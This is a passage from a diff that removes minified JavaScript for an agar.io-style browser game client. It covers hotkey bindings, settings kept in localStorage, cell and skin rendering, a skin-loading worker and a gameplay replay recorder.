-                        "m-feed": "",
-                        "m-feedMacro": ""
-                    },
-                    A = {
-                        "Switch Tab": "switchMultibox",
-                        Feed: "feed",
-                        "Macro Feed": "feedMacro",
-                        Split: "split",
-                        "Double Split": "splitx2",
-                        "Triple Split": "splitx3",
-                        "Quad Split": "splitMax",
-                        "32 Split": "split32",
-                        "64 Split": "split64",
-                        "128 Split": "split128",
-                        "256 Split": "split256",
-                        "Diagonal Linesplit": "linesplit",
-                        "Freeze Mouse": "freezeMouse",
-                        "Lock Linesplit": "lockLinesplit",
-                        "Lock Mouse Direction": "lockMouse",
-                        Respawn: "respawn",
-                        "Toggle Auto Respawn": "toggleAutoRespawn",
-                        "Stop Movement": "stopMovement",
-                        "Toggle Skins": "toggleSkins",
-                        "Toggle Names": "toggleNames",
-                        "Toggle Mass": "toggleMass",
-                        "Toggle Spectate Lock": "spectateLock",
-                        "Select Player": "selectPlayer",
-                        "Start/Stop Recording": "saveReplay",
-                        "Toggle Chat": "toggleChat",
-                        "Toggle Toast Chat": "toggleChatToast",
-                        "Toggle HUD": "toggleHud",
-                        "Zoom: Level 1": "zoomLevel1",
-                        "Zoom: Level 2": "zoomLevel2",
-                        "Zoom: Level 3": "zoomLevel3",
-                        "Zoom: Level 4": "zoomLevel4",
-                        "Zoom: Level 5": "zoomLevel5",
-                        "Double Split Macro": "switchSplit",
-                        "Linesplit Trick Macro": "switchLinesplit",
-                        "One Split Trigger": "splitTrigger",
-                        "Double Split Trigger": "doublesplitTrigger",
-                        "Linesplit Trigger": "linesplitTrigger",
-                        "Context Menu": "contextMenu"
-                    },
-                    u = {
-                        Feed: "m-feed",
-                        "Feed Macro": "m-feedMacro",
-                        Split: "m-split",
-                        "Double Split": "m-splitx2",
-                        "Triple Split": "m-splitx3",
-                        "Quad Split": "m-splitMax",
-                        "32 Split": "m-split32",
-                        "64 Split": "m-split64",
-                        "128 Split": "m-split128",
-                        "256 Split": "m-split256",
-                        "Diagonal Linesplit": "m-linesplit",
-                        "Freeze Mouse": "m-freezeMouse",
-                        "Lock Linesplit": "m-lockLinesplit",
-                        Respawn: "m-respawn",
-                        "Stop Movement": "m-stopMovement"
-                    },
-                    d = t.g.input = new class {
-                        constructor() {
-                            this.version = 2, this.released = new Map, this.pressed = new Map, this.load()
-                        }
-                        hFn() {
-                            +localStorage.getItem("hotkeysVersion") !== this.version && (localStorage.setItem("hotkeysVersion", "" + this.version), "hotkeys" in localStorage) && localStorage.removeItem("hotkeys")
-                        }
-                        load() {
-                            try {
-                                var $ = JSON.parse(localStorage.getItem("hotkeys"));
-                                if ("object" != typeof $ || null == $) throw Error("Parsing hotkeys failed, opting for defaults");
-                                var e = Object.values($),
-                                    t = Object.assign({}, h);
-                                let x;
-                                for (x in t) {
-                                    var s = t[x];
-                                    s && e.includes(s) && (t[x] = h[x])
-                                }
-                                "multibox" in $ && $.multibox && !$.switchMultibox ? (delete $.multibox, $.switchMultibox = $.multibox) : $.switchMultibox || ($.switchMultibox = h.switchMultibox), this.WuV = Object.assign(t, $)
-                            } catch (i) {
-                                (0, n.$s)(2, "string" == typeof i ? i : i && i.message || "An error occurred while parsing hotkeys"), this.WuV = Object.assign({}, h)
-                            }
-                            this.hNu(this.WuV)
-                        }
-                        save() {
-                            localStorage.setItem("hotkeys", JSON.stringify(this.WuV))
-                        }
-                        reset() {
-                            return localStorage.removeItem("hotkeys"), this.load(), this.WuV
-                        }
-                        get($) {
-                            return $ in this.WuV && this.WuV[$] || "None"
-                        }
-                        set($, e) {
-                            if (!c.has($)) return !1;
-                            if (this.WuV[$] !== e) {
-                                if (e) {
-                                    let t;
-                                    for (t of Object.entries(this.WuV)) t[1] === e && (this.WuV[t[0]] = "")
-                                }
-                                this.WuV[$] = e, this.save(), this.hNu(this.WuV)
-                            }
-                            return !0
-                        }
-                        hNu($) {
-                            this.pressed.clear();
-                            let e;
-                            for (e in $) {
-                                var t, n = $[e];
-                                c.has(e) && (t = c.get(e), this.pressed.set(n, t))
-                            }
-                            this.released.clear(), "feedMacro" in $ && this.released.set($.feedMacro, () => x.A.kmM.feed(!1)), "m-feedMacro" in $ && this.released.set($["m-feedMacro"], () => {
-                                s.A.get("switchControlMode") && x.A.eWI[0 === i.A.yNT ? 1 : 0].jjW(!1)
-                            })
-                        }
-                        press($) {
-                            return !!this.pressed.has($) && (this.pressed.get($)(), !0)
-                        }
-                        release($) {
-                            return !!this.released.has($) && (this.released.get($)(), !0)
-                        }
-                        XRq($) {
-                            return $ ? $.toString().toUpperCase().replace(/^(LEFT|RIGHT|NUMPAD|DIGIT|KEY)/, "") : "Unknown"
-                        }
-                    }
-            },
-            34738($, e, t) {
-                t.d(e, {
-                    A: () => c
-                });
-                var x = t(95195),
-                    s = t(95514),
-                    i = t(92915),
-                    n = (t(15308), t(61036)),
-                    a = t(75908),
-                    o = t(87706),
-                    r = t(83529);
-                let l = a.aN;
-                class c {
-                    constructor($) {
-                        this.tagId = null, this.pid = $, this.texture = o.RenderTexture.create({
-                            width: a.eU + l,
-                            height: a.eU + l,
-                            resolution: r.A.get("gameResolution")
-                        }), this.HcK = this.duk(), this.PJd()
-                    }
-                    get visibility() {
-                        let $ = 2;
-                        return x.A.eWI.some(e => !(!e.connected || e.tagId !== this.tagId || ($ = 1, 0))), $
-                    }
-                    fyP($) {
-                        return this.tagId !== ($ = $ || null) && (this.tagId = $, !0)
-                    }
-                    rAX($, e = 9.5, t = 20) {
-                        this.wFC = $ = $ || 0, (t = new o.Graphics().lineStyle(t, $, 1).drawCircle(0, 0, a.Wp - e).endFill()).pivot.set(-a.Wp), s.Uk.render(t, this.texture, !1)
-                    }
-                    AcX($) {
-                        $ !== this.Rak && ($ ? this.Rak = !0 : delete this.Rak, x.A.VTJ.filter($ => $.pid === this.pid).forEach(e => {
-                            $ ? e.xtA() : e.DgL()
-                        }))
-                    }
-                    duk() {
-                        var $ = new o.Container;
-                        return $.pivot.set(-a.eU / 2), $.addChildAt(this.PzK = (0, a.Jm)(this.ppI = c.wed(this), this.SYL = c.lUo(this)), 0), $.scale.set(a.eU / (2 * a.Wp)), $.position.set(l / 2, l / 2), $
-                    }
-                    PJd() {
-                        s.Uk.render(this.HcK, this.texture, !0), this.wFC && this.rAX(this.wFC)
-                    }
-                    static wed($) {
-                        var e = x.A.MOW($.pid),
-                            $ = $.fvy ? i.O$ : i.ic;
-                        return $[n.RI(e * $.length)]
-                    }
-                    static lUo($) {
-                        var e = x.A.MOW($.pid),
-                            $ = $.fvy ? i.oZ : i.cy;
-                        return $[n.RI(e * $.length)]
-                    }
-                }
-                c.prototype.destroyed = !1
-            },
-            53278($, e, t) {
-                t.d(e, {
-                    A: () => n
-                });
-                var x = t(83529),
-                    s = t(33656),
-                    e = t(34738),
-                    i = t(87706);
-                class n extends e.A {
-                    constructor($) {
-                        super($)
-                    }
-                    gkY($) {
-                        return this.name !== $ && (this.name = $, this.DGt(), !0)
-                    }
-                    DGt() {
-                        this.xMs(this.name || s.Ab)
-                    }
-                    xMs($) {
-                        this.RiW ? this.RiW.text = $ : this.RiW = new i.Text($, x.A.lqB), this.RiW.style.fill = 16777215, this.RiW.updateText(!1)
-                    }
-                    AaG() {
-                        this.cSM = null != this.vyo ? this.vyo : x.A.get("namesEnabled") && x.A.get("showNames") >= this.visibility, this.VAP = x.A.get("massEnabled") && x.A.get("showMass") >= this.visibility
-                    }
-                    destroy() {
-                        this.HcK.destroy(!0), this.texture.VqU = !0, this.texture.destroy(!0), this.RiW && (this.RiW.destroy(!0), delete this.RiW), this.destroyed = !0
-                    }
-                }
-                n.prototype.destroyed = !1, n.prototype.fvy = !0
-            },
-            35827($, e, t) {
-                t.d(e, {
-                    A: () => a
-                });
-                var x = t(41958),
-                    s = t(53278),
-                    i = t(78225),
-                    e = (t(15308), t(37007)),
-                    e = t.n(e),
-                    n = t(33656);
-                class a extends e() {
-                    constructor($) {
-                        super(), this.players = new Map, this.bots = new Map, this.IOE = [, , ], this.CBb = [], this.game = $
-                    }
-                    reset() {
-                        this.players.forEach($ => $.destroy()), this.players.clear(), this.bots.forEach($ => $.destroy()), this.bots.clear(), this.IOE.splice(0, 2), this.CBb.splice(0, this.CBb.length)
-                    }
-                    get zZH() {
-                        return this.bots.size
-                    }
-                    get eLz() {
-                        return this.players.size
-                    }
-                    has($) {
-                        return this.players.has($) || this.bots.has($)
-                    }
-                    vrx($) {
-                        return this.players.has($) ? this.players.get($) : null
-                    }
-                    qsc($) {
-                        return this.bots.has($) ? this.bots.get($) : null
-                    }
-                    get($) {
-                        return this.players.has($) ? this.players.get($) : this.bots.has($) ? this.bots.get($) : null
-                    }
-                    ytA($, e) {
-                        this.IOE[$] = e
-                    }
-                    ZRd($) {
-                        return this.IOE[$] || null
-                    }
-                    RRW({
-                        pid: $,
-                        nickname: e,
-                        skin: t,
-                        skinUrl: a,
-                        hWu: o,
-                        tagId: r,
-                        bot: l,
-                        ...c
-                    }) {
-                        var h;
-                        let A;
-                        return l ? this.bots.has($) || (this.bots.set($, A = new s.A($)), A.gkY(n.LK), A.AaG(), this.emit("JmnFrX", $)) : (h = (this.players.has($) ? (A = this.players.get($), this.emit("uJxLgi", $)) : (A = new x.A($), 0 <= (h = i.A.pids.indexOf($)) && (this.IOE[h] = A), this.players.set($, A), this.emit("WnIviS", $)), "string" != typeof t || l || (a = "https://skins.vanis.io/s/" + t), c.perk_badges && (A.jqz = c.perk_badges), A.gkY(e, o || c.perk_color)), $ = A.Xtl(a), l = A.fyP(r), (h || $ || l) && A.AaG()), A
-                    }
-                    AaG($, e) {
-                        this.players.forEach(e => {
-                            $ && $.has(e) || e.AaG()
-                        }), this.bots.forEach($ => {
-                            e && e.has($) || $.AaG()
-                        })
-                    }
-                    NAQ($, e = !1) {
-                        this.players.has($) && (e ? this.CBb.push($) : (e = this.players.get($), this.players.delete($), this.emit("KneCHr", $), e.destroy()))
-                    }
-                    Wca($, e = !1) {
-                        this.bots.has($) && (e ? this.CBb.push($) : (e = this.bots.get($), this.bots.delete($), this.emit("seZDXL", $), e.destroy()))
-                    }
-                    remove($, e = !1) {
-                        e ? this.CBb.push($) : this.bots.has($) ? this.Wca($) : this.NAQ($)
-                    }
-                    rvD() {
-                        for (var $ = this.CBb; $.length;) {
-                            var e = $.shift();
-                            this.remove(e)
-                        }
-                    }
-                }
-            },
-            41958($, e, t) {
-                t.d(e, {
-                    A: () => c
-                });
-                var x = t(95195),
-                    s = t(83529),
-                    i = t(15308),
-                    n = t(75908),
-                    e = t(34738),
-                    a = t(95514),
-                    o = t(33656),
-                    r = t(87706);
-                let l = (0, n.Jm)(0, 0);
-                class c extends e.A {
-                    constructor($) {
-                        super($), this.skinUrl = null, this.isMe = x.A.state.pids.includes($)
-                    }
-                    GRd($) {
-                        return $ = new r.BaseTexture(new r.resources.ImageBitmapResource($)), $ = new r.Texture($), ($ = new r.Sprite($)).anchor.set(.5), $.width = $.height = n.eU, $.position.set(0, 0), $
-                    }
-                    cPn($) {
-                        return this.TIJ = $ ? "#" + $ : null, this.hWu = $ ? parseInt($, 16) : null
-                    }
-                    gkY($, e) {
-                        return $ = $ || o.Ab, (this.tQg !== $ || this.aLU !== e) && (this.tQg = $, this.aLU = e, this.DGt(), !0)
-                    }
-                    DGt() {
-                        var $ = this.tQg === o.Ab,
-                            e = this.tQg === o.CF;
-                        let t = $ ? "" : this.tQg;
-                        var i = this.name,
-                            n = this.hWu;
-                        let a = this.cPn($ || e ? null : this.aLU);
-                        this.xMs(t, a), !$ && !e && this.RiW.texture.width > s.A.get("cellLongNameThreshold") && (t = o.CF, a = this.cPn(null), this.xMs(t, a)), this.name = $ ? o.Ab : t, i === this.name && n === this.hWu || x.A.emit("VAEhBF", this.pid, t, a, a || null)
-                    }
-                    xMs($, e) {
-                        this.RiW ? this.RiW.text = $ : this.RiW = new r.Text($, s.A.lqB), this.RiW.style.fill = "number" == typeof e ? e : 16777215, this.RiW.updateText(!1)
-                    }
-                    Xtl($) {
-                        return ($ = $ || null) !== this.skinUrl && (this.iIm(), this.yLF() && this.PJd(), this.skinUrl = $, this.urX && this.Tqd(), !0)
-                    }
-                    yLF() {
-                        return !!this.tFf && (this.HcK.removeChild(l), this.tFf.mask = null, this.tFf.destroy(!0), delete this.tFf, !0)
-                    }
-                    Tqd() {
-                        this.iIm(), this.XIv = x.A.kpA.bCr(this.skinUrl, $ => {
-                            this.tFf = this.GRd($), (this.tFf.mask = l).position.set(0, 0), this.HcK.addChild(this.tFf.mask, this.tFf), this.PJd()
-                        })
-                    }
-                    AaG() {
-                        let $ = s.A.get("namesEnabled"),
-                            e = s.A.get("skinsEnabled"),
-                            t = s.A.get("massEnabled");
-                        t = this.isMe ? ($ = s.A.get("showOwnName"), e = s.A.get("showOwnSkin"), s.A.get("showOwnMass")) : ($ = s.A.get("showNames") >= this.visibility, e = s.A.get("showSkins") >= this.visibility, s.A.get("showMass") >= this.visibility), $ = s.A.get("namesEnabled") && $, e = s.A.get("skinsEnabled") && e, t = s.A.get("massEnabled") && t, null != this.vyo && ($ = this.vyo), (e = null != this.GeA ? this.GeA : e) && !this.urX ? this.tFf ? (this.tFf.visible = !0, this.PJd()) : null != this.skinUrl && this.Tqd() : !e && this.urX && (this.iIm(), this.tFf) && (this.tFf.visible = !1, this.PJd()), this.cSM = $, this.urX = e, this.VAP = t, this.eew = s.A.get("showNameColor")
-                    }
-                    iIm() {
-                        this.XIv && (this.XIv(), delete this.XIv)
-                    }
-                    rAX($, e = 5.5, t = 10, x = 1) {
-                        this.wFC = $ = $ || 0, (t = this.qTn = new r.Graphics().lineStyle(t, $, x).drawCircle(0, 0, n.Wp - e).endFill()).pivot.set(0, 0), t.position.set(n.Wp + n.aN / 2, n.Wp + n.aN / 2), a.Uk.render(t, this.texture, !1)
-                    }
-                    PJd() {
-                        var $;
-                        let e = this.SYL;
-                        this.isMe || !this.tFf || !this.urX && !this.GeA || 0 === ($ = (0, n.E1)(a.Uk.extract.pixels(this.tFf))) || isNaN($) || (e = $), this.PzK.clear(), this.PzK.lineStyle(5, (0, i.v2)(e, .5), 1).beginFill(this.ppI).drawCircle(0, 0, n.Wp + .5).endFill(), super.PJd()
-                    }
-                    destroy() {
-                        this.iIm(), this.yLF(), this.HcK.destroy(!0), this.texture.destroy(!0), this.texture.VqU = !0, this.RiW && this.RiW.destroy(!0), x.A.emit("kIoddg", this.pid), this.destroyed = !0
-                    }
-                }
-                c.prototype.destroyed = !1, c.prototype.faB = !0
-            },
-            75908($, e, t) {
-                t.d(e, {
-                    E1: () => r,
-                    Jm: () => o,
-                    Wp: () => n,
-                    aN: () => a,
-                    eU: () => i
-                });
-                var e = t(83529),
-                    x = t(61036),
-                    s = t(87706);
-                let i = e.A.GAS,
-                    n = i / 2,
-                    a = e.A.get("cellBorderSize"),
-                    o = ($, e) => new s.Graphics().lineStyle(5, e, 1).beginFill($).drawCircle(0, 0, n + .5).endFill(),
-                    r = $ => {
-                        for (var e = 0, t = 0, s = 0, i = 0, n = $.byteLength, a = 0; a < n; a += 4) {
-                            var o = $[a],
-                                r = $[a + 1],
-                                l = $[a + 2],
-                                c = $[a + 3];
-                            e += o * o * c, t += r * r * c, s += l * l * c, i += c
-                        }
-                        return i ? x.LI(x.RZ(e / i)) << 16 | x.LI(x.RZ(t / i)) << 8 | x.LI(x.RZ(s / i)) << 0 : NaN
-                    }
-            },
-            35963($, e, t) {
-                t.d(e, {
-                    A: () => i
-                });
-                var x = t(95514),
-                    s = t(30847);
-                let i = new class {
-                    constructor() {
-                        this.chunks = [], this.running = !1;
-                        var $ = x.Uk.view.captureStream(30);
-                        this.recorder = new MediaRecorder($, {
-                            mimeType: "video/webm; codecs=vp9",
-                            audioBitsPerSecond: 0,
-                            videoBitsPerSecond: 5e6
-                        }), this.recorder.addEventListener("dataavailable", $ => this.add($.data))
-                    }
-                    start() {
-                        this.running || (this.chunks.length = 0, this.running = !0, this.recorder.start(30))
-                    }
-                    add($) {
-                        450 < this.chunks.length && this.chunks.shift(), this.chunks.push($)
-                    }
-                    async download() {
-                        var $ = this.chunks.slice(0);
-                        this.stop();
-                        {
-                            var e = $ => $ < 10 ? "0" + $ : "" + $,
-                                t = new Date,
-                                e = t.getFullYear() + "-" + e(t.getMonth() + 1) + "-" + e(t.getDate()) + "." + e(t.getHours()) + "-" + e(t.getMinutes()) + "-" + e(t.getSeconds()),
-                                t = URL.createObjectURL(new Blob($, {
-                                    type: "video/webm"
-                                }));
-                            let x = document.createElement("a");
-                            x.href = t, x.setAttribute("download", e + ".webm"), document.body.appendChild(x), x.click(), (0, s.wg)(() => document.body.removeChild(x))
-                        }
-                        return Math.round($.length / 15)
-                    }
-                    stop() {
-                        this.running && (this.running = !1, this.chunks.length = 0, this.recorder.stop())
-                    }
-                }
-            },
-            83529($, e, t) {
-                t.d(e, {
-                    A: () => h
-                });
-                var e = t(58489),
-                    x = t(61036),
-                    s = t(15308),
-                    i = t(37007),
-                    i = t.n(i),
-                    n = t(87706);
-                t(31091), t(57088);
-                let a = new Map,
-                    o = (a.set("useWebGL", new e.A("useWebGL", !0)), a.set("gameResolution", new e.A("gameResolution", 1)), a.set("smallTextThreshold", new e.A("smallTextThreshold", 40)), a.set("autoZoom", new e.A("autoZoom", !1)), a.set("rememeberEjecting", new e.A("rememeberEjecting", !0)), a.set("autoRespawn", new e.A("autoRespawn", !1)), a.set("mouseFreezeSoft", new e.A("mouseFreezeSoft", !0)), a.set("drawDelay", new e.A("drawDelay", 120)), a.set("cameraMoveDelay", new e.A("cameraMoveDelay", 150)), a.set("cameraSwitchDelay", new e.A("cameraSwitchDelay", 200)), a.set("cameraZoomDelay", new e.A("cameraZoomDelay", 150)), a.set("cameraZoomSpeed", new e.A("cameraZoomSpeed", 10)), a.set("replayDuration", new e.A("replayDuration", 8)), a.set("showReplaySaved", new e.A("showReplaySaved", 2)), a.set("showNames", new e.A("showNames", 2)), a.set("showMass", new e.A("showMass", 2)), a.set("showSkins", new e.A("showSkins", 1)), a.set("showOwnName", new e.A("showOwnName", !0)), a.set("showOwnMass", new e.A("showOwnMass", !0)), a.set("showOwnSkin", new e.A("showOwnSkin", !0)), a.set("showCrown", new e.A("showCrown", !0)), a.set("foodVisible", new e.A("foodVisible", !0)), a.set("eatAnimation", new e.A("eatAnimation", !0)), a.set("showHud", new e.A("showHud", !0)), a.set("showLeaderboard", new e.A("showLeaderboard", !0)), a.set("showServerName", new e.A("showServerName", !1)), a.set("showChat", new e.A("showChat", !0)), a.set("showChatToast", new e.A("showChatToast", !1)), a.set("minimapEnabled", new e.A("minimapEnabled", !0)), a.set("minimapLocations", new e.A("minimapLocations", !0)), a.set("showFPS", new e.A("showFPS", !0)), a.set("showPing", new e.A("showPing", !0)), a.set("showCellCount", new e.A("showCellCount", !0)), a.set("showPlayerScore", new e.A("showPlayerScore", !1)), a.set("showPlayerMass", new e.A("showPlayerMass", !0)), a.set("showLatencyWarning", new e.A("showLatencyWarning", !0)), a.set("showClock", new e.A("showClock", !1)), a.set("showSessionTime", new e.A("showSessionTime", !1)), a.set("showPlayerCount", new e.A("showPlayerCount", !1)), a.set("showSpectators", new e.A("showSpectators", !1)), a.set("showRestartTiming", new e.A("showRestartTiming", !1)), a.set("showTagTotalMass", new e.A("showRestartTiming", !1)), a.set("showBlockedMessageCount", new e.A("showBlockedMessageCount", !0)), a.set("filterChatMessages", new e.A("filterChatMessages", !0)), a.set("clearChatMessages", new e.A("clearChatMessages", !0)), a.set("backgroundColor", new e.A("backgroundColor", "101010")), a.set("borderColor", new e.A("borderColor", "000000")), a.set("foodColor", new e.A("foodColor", "ffffff")), a.set("ejectedColor", new e.A("ejectedColor", "ea2577")), a.set("cellNameOutlineColor", new e.A("cellNameOutlineColor", "000000")), a.set("cursorImageUrl", new e.A("cursorImageUrl", "")), a.set("backgroundImageUrl", new e.A("backgroundImageUrl", "./img/background.png")), a.set("virusImageUrl", new e.A("virusImageUrl", "./img/virus.png")), a.set("arrowImageUrl", new e.A("arrowImageUrl", "./img/arrow.png")), a.set("cellMassColor", new e.A("cellMassColor", "ffffff")), a.set("cellMassOutlineColor", new e.A("AAA", "000000")), a.set("cellNameFont", new e.A("cellNameFont", "Hind Madurai")), a.set("cellNameWeight", new e.A("cellNameWeight", 1)), a.set("cellNameOutline", new e.A("cellNameOutline", 2)), a.set("cellNameSmoothOutline", new e.A("cellNameSmoothOutline", !0)), a.set("cellLongNameThreshold", new e.A("cellLongNameThreshold", 750)), a.set("cellMassFont", new e.A("cellMassFont", "Ubuntu")), a.set("cellMassWeight", new e.A("cellMassWeight", 2)), a.set("cellMassOutline", new e.A("cellMassOutline", 2)), a.set("cellMassTextSize", new e.A("cellMassTextSize", 0)), a.set("cellMassSmoothOutline", new e.A("cellMassSmoothOutline", !0)), a.set("shortMass", new e.A("shortMass", !0)), a.set("showBackgroundImage", new e.A("showBackgroundImage", !0)), a.set("backgroundImageRepeat", new e.A("backgroundImageRepeat", !0)), a.set("backgroundDefaultIfUnequal", new e.A("backgroundDefaultIfUnequal", !0)), a.set("backgroundImageOpacity", new e.A("backgroundImageOpacity", .6)), a.set("useFoodColor", new e.A("useFoodColor", !1)), a.set("namesEnabled", new e.A("namesEnabled", !0)), a.set("skinsEnabled", new e.A("skinsEnabled", !0)), a.set("massEnabled", new e.A("massEnabled", !0)), a.set("showLocations", new e.A("showLocations", !1)), a.set("cellBorderSize", new e.A("cellBorderSize", 1)), a.set("autoHideReplayControls", new e.A("autoHideReplayControls", !1)), a.set("minimapSize", new e.A("minimapSize", 220)), a.set("minimapFPS", new e.A("minimapFPS", 30)), a.set("minimapSmoothing", new e.A("minimapSmoothing", .08)), a.set("rememeberEjecting", new e.A("rememeberEjecting", !0)), a.set("switchUnfocusedColor", new e.A("switchUnfocusedColor", 16777215)), a.set("switchFocusedColor", new e.A("switchFocusedColor", 16711935)), a.set("activeTabContext", new e.A("activeTabContext", 0)), a.set("animateEjectedCells", new e.A("animateEjectedCells", !0)), a.set("animatePlayerCells", new e.A("animatePlayerCells", !1)), a.set("inputs", new e.A("inputs", '{"names":["Tab 1","Tab 2"],"skins":["https://skins.vanis.io/s/OKKqrM","https://skins.vanis.io/s/OKKqrM"],"tags":["",""]}')), a.set("showTotalPlayerMass", new e.A("showTotalPlayerMass", !0)), a.set("showTotalPlayerScore", new e.A("showTotalPlayerScore", !0)), a.set("excludeBotsOnLeaderboard", new e.A("excludeBotsOnLeaderboard", !1)), a.set("useAntialiasing", new e.A("useAntialiasing", !1)), a.set("menuFoodGlow", new e.A("menuFoodGlow", !1)), a.set("chatHeight", new e.A("chatHeight", 200)), a.set("lineSplitDelay", new e.A("lineSplitDelay", 750)), a.set("cellsOpacity", new e.A("cellsOpacity", 1)), a.set("showStats", new e.A("showStats", !0)), a.set("useSharedViewport", new e.A("useSharedViewport", !0)), a.set("sharedViewportMaxDistance", new e.A("sharedViewportMaxDistance", 7e3)), a.set("linkTabNames", new e.A("linkTabNames", !1)), a.set("linkTabSkins", new e.A("linkTabSkins", !1)), a.set("linkTabTags", new e.A("linkTabTags", !1)), a.set("joinTabsTogether", new e.A("joinTabsTogether", !1)), a.set("switchControlMode", new e.A("switchControlMode", !1)), a.set("hudScale", new e.A("hudScale", 1)), a.set("triggerAtCells", new e.A("triggerAtCells", 12)), a.set("triggerIgnoreSizeEnabled", new e.A("triggerIgnoreSizeEnabled", !1)), a.set("triggerIgnoreSizeBelow", new e.A("triggerIgnoreSizeBelow", 10)), a.set("minimapResolution", new e.A("minimapResolution", 1.5)), a.set("showMinimapStats", new e.A("showMinimapStats", !0)), a.set("tabStatusMode", new e.A("tabStatusMode", 0)), ($, e) => {
-                        let t;
-                        switch ($) {
-                            case 3:
-                                t = e / 5;
-                                break;
-                            case 1:
-                                t = e / 20;
-                                break;
-                            default:
-                                t = e / 10
-                        }
-                        return x.mk(t)
-                    }),
-                    r = $ => 0 === $ ? "thin" : 2 === $ ? "bold" : "normal",
-                    l = "extendedSettings";
-                class c extends i() {
-                    buj() {
-                        this.set("inputs", JSON.stringify(this.inputs))
-                    }
-                    DQm() {
-                        try {
-                            let $;
-                            "inputs" in this.njC ? $ = this.get("inputs") : ((0, s.$s)(1, "No player inputs found; falling back to defaults"), $ = this.eyU("inputs"), this.set("inputs", $)), this.inputs = JSON.parse($)
-                        } catch (e) {
-                            (0, s.$s)(1, "Failed to parse player inputs; falling back to defaults"), this.inputs = JSON.parse(this.eyU("inputs")), this.buj()
-                        }
-                    }
-                    constructor() {
-                        super(), this.GAS = 512, this.setMaxListeners(0);
-                        let $ = {},
-                            e = 0;
-                        if (l in localStorage) try {
-                            $ = JSON.parse(localStorage.getItem(l)), e = 1
-                        } catch (t) {}
-                        if (!e && "settings" in localStorage) try {
-                            $ = JSON.parse(localStorage.getItem("settings")), e = 2
-                        } catch (x) {}
-                        0 === e ? (this.njC = $ = {}, a.forEach((e, t) => {
-                            $[t] = e.value
-                        }), this.store()) : this.njC = $, a.forEach((e, t) => {
-                            t in $ || ($[t] = e.value)
-                        }), this.DQm(), 2 === e && this.store(), this.set("skinsEnabled", !0), this.set("namesEnabled", !0), this.set("massEnabled", !0), this.QNM(), this.bsH()
-                    }
-                    store() {
-                        localStorage.setItem(l, JSON.stringify(this.njC))
-                    }
-                    QNM() {
-                        var $ = new n.TextStyle({
-                                fontFamily: this.get("cellNameFont"),
-                                fontSize: 80,
-                                fontWeight: r(this.get("cellNameWeight"))
-                            }),
-                            e = this.get("cellNameOutline");
-                        e && ($.stroke = parseInt(this.get("cellNameOutlineColor"), 16), $.strokeThickness = o(e, $.fontSize), $.lineJoin = this.get("cellNameSmoothOutline") ? "round" : "miter"), this.lqB = $
-                    }
-                    bsH() {
-                        var $ = new n.TextStyle({
-                                fontFamily: this.get("cellMassFont"),
-                                fontSize: 56 + 20 * this.get("cellMassTextSize"),
-                                fontWeight: r(this.get("cellMassWeight")),
-                                lineJoin: "round",
-                                fill: parseInt(this.get("cellMassColor"), 16)
-                            }),
-                            e = this.get("cellMassOutline");
-                        e && ($.stroke = parseInt(this.get("cellMassOutlineColor"), 16), $.strokeThickness = o(e, $.fontSize), $.lineJoin = this.get("cellMassSmoothOutline") ? "round" : "miter"), this.jLt = $
-                    }
-                    get useWebGL() {
-                        return n.utils.isWebGLSupported() && this.get("useWebGL")
-                    }
-                    eyU($) {
-                        return a.has($) ? a.get($).value : null
-                    }
-                    has($) {
-                        return $ in this.njC
-                    }
-                    get($) {
-                        return this.has($) ? this.njC[$] : this.eyU($)
-                    }
-                    set($, e) {
-                        return !(this.has($) && this.get($) === e || (a[$] !== e ? this.njC[$] = e : delete this.njC[$], this.store(), this.emit("zrVIMz", $, e), 0))
-                    }
-                    org($) {
-                        return Number(this.get($))
-                    }
-                    lQo($) {
-                        return "" + this.get($)
-                    }
-                    dlo($) {
-                        return !!this.get($)
-                    }
-                }
-                e = new c;
-                let h = t.g.settings = e
-            },
-            58489($, e, t) {
-                t.d(e, {
-                    A: () => x
-                });
-                class x {
-                    constructor($, e) {
-                        this.key = $, this.value = e
-                    }
-                }
-            },
-            82196($, e, t) {
-                t.d(e, {
-                    A: () => i
-                });
-                var x = t(15308);
-                let s = ($, e) => !((e = ($ = $.callbacks).indexOf(e)) < 0 || ($.splice(e, 1), 0));
-                class i {
-                    constructor() {
-                        this.loaders = new Map, this.UQz()
-                    }
-                    UQz() {
-                        let $ = new URL(t(97833), t.b);
-                        fetch($).then(async e => {
-                            e = URL.createObjectURL(await e.blob()), (0, x.$s)(0, 'Skin worker loaded asynchronously at "' + e + '" from file at "' + $ + '"'), this.worker = new Worker(e), this.worker.addEventListener("message", this.vzR.bind(this))
-                        }).catch(() => {
-                            (0, x.$s)(2, 'Skin worker failed to load asynchronously from file at "' + $ + '"?')
-                        })
-                    }
-                    hha() {
-                        this.loaders.clear()
-                    }
-                    bCr($, e) {
-                        let t;
-                        if (!this.loaders.has($)) return this.loaders.set($, t = {
-                            callbacks: [e]
-                        }), this.worker.postMessage($), s.bind(null, t, e);
-                        if (null != (t = this.loaders.get($)).image) e(t.image);
-                        else if (!t.errored) return t.callbacks.push(e), s.bind(null, t, e);
-                        return null
-                    }
-                    vzR($) {
-                        var e = $.data,
-                            $ = this.loaders.get(e.url);
-                        if (e.errored) $.errored = !0, $.callbacks.length = 0;
-                        else {
-                            $.image = e.image;
-                            for (var t = $.callbacks; t.length;) t.pop()(e.image)
-                        }
-                    }
-                }
-            },
-            78225($, e, t) {
-                t.d(e, {
-                    A: () => s
-                });
-                var x = t(83529);
-                let s = new class {
-                    get bTs() {
-                        return this.VqP[this.yNT]
-                    }
-                    get biB() {
-                        return this.OcY[this.yNT]
-                    }
-                    constructor() {
-                        this.selectedServer = null, this.VqP = [0, 0], this.OcY = [0, 0], this.zCS = [!1, !1], this.tXL = [!1, !1], this.pids = [0, 0], this.yNT = 0, this.rendering = !0, this.Xwi = null, this.yNT = x.A.get("activeTabContext"), (isNaN(this.yNT) || 0 !== this.yNT && 1 !== this.yNT) && (this.yNT = 0, x.A.set("activeTabContext", 0))
-                    }
-                    reset() {
-                        this.VqP = [0, 0], this.OcY = [0, 0], this.zCS = [!1, !1], this.tXL = [!1, !1], this.pids = [0, 0], this.Ebi = "Play", this.Xwi = null
-                    }
-                    jMO($) {
-                        this.selectedServer = $, this.Xwi = $.url
-                    }
-                    get vSE() {
-                        return this.selectedServer?.url || null
-                    }
-                }
-            },
-            97665($, e, t) {
-                t.d(e, {
-                    Sl: () => x
-                }), t(61036);
-                let x = ($, e) => {
-                    var t = $.x - e.x,
-                        $ = $.y - e.y;
-                    return t * t + $ * $
-                }
-            },
-            24968($, e, t) {
-                t.d(e, {
-                    A: () => s
-                });
-                var x = t(61036);
-                class s {
